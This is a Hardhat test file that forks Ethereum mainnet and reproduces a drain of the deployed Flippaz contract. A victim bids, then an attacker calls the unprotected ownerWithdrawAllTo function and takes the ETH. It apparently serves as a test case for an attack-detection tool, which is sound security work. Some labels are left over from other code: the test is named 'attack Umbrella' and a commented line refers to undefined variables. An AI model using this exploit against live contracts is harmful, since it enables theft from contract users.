import { ethers } from 'hardhat'
import { Flippaz } from '../typechain-types'
import { expect } from 'chai'
import { SignerWithAddress } from '@nomicfoundation/hardhat-ethers/signers'

describe('CCA Detects Sandbox Attack Test', async function () {
    async function getContractBalance(contractAddress: string) {
        const balance = await ethers.provider.getBalance(contractAddress)
        return ethers.formatEther(balance)
    }
    let attacker: SignerWithAddress
    let victim: SignerWithAddress
    let flippaz: Flippaz
    beforeEach(async () => {
        ;[attacker, victim] = await ethers.getSigners()
        flippaz = await ethers.getContractAt('Flippaz', '0xE85A08Cf316F695eBE7c13736C8Cc38a7Cc3e944')
    })

    it('should block number equal to 15083765', async function () {
        const blockNumber = await ethers.provider.getBlockNumber()
        expect(blockNumber).to.equal(15083765)
    })

    it('should attack Umbrella', async function () {
        const contractBalanceBefore = await getContractBalance(await flippaz.getAddress())

        let attackerBalanceBefore = await getContractBalance(await attacker.getAddress())
        console.log('ETH balance of attacker Alice:', attackerBalanceBefore)
        console.log('Before exploiting, ETH balance of FlippazOne Contract:', contractBalanceBefore)
        //await skr.connect(owner).withdraw(8792873290680252648282n)
        await flippaz.connect(victim).bid({ value: ethers.parseEther('2') })
        const contractBalanceAfter = await getContractBalance(await flippaz.getAddress())
        console.log('After bidding, ETH balance of FlippazOne Contract:', contractBalanceAfter)
        await flippaz.ownerWithdrawAllTo(attacker.getAddress())
        let attackerBalanceAfter = await getContractBalance(await attacker.getAddress())
        let balanceAfter = await getContractBalance(await flippaz.getAddress())
        console.log('ETH balance of attacker Alice:', attackerBalanceAfter)
        console.log('After exploiting, ETH balance of FlippazOne Contract:', balanceAfter)
    })
})
